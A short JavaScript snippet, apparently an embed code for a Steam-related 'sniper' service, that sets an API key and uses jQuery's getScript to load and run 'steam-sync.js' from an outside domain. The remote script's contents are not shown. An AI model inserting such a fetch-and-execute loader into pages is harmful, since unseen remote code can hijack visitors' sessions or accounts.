var apikey = "apikeylongkey";
var apidomain = "https://sniper.adminconsole.app";
$.getScript( apidomain + "/steam-sync.js", function( data, textStatus, jqxhr ) { init(apidomain,apikey); });
